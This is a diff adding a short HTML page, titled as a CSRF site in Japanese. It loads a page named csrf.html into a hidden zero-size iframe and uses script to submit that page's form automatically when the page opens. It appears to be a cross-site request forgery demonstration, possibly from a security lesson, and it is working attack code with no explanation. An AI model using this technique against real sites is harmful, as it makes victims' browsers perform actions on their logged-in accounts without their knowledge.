@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CSRF</title>
+</head>
+
+<body>
+<h1>CSRFサイト</h1>
+
+
+<iframe src="csrf.html" width="0" height="0" id="csrf-iframe"></iframe>
+
+<script>
+	const csrf_iframe = document.getElementById("csrf-iframe");
+  const form = csrf_iframe.contentWindow.document.querySelector('#csrf-form');
+  form.submit()
+</script>
+
+</body>
+
+</html>
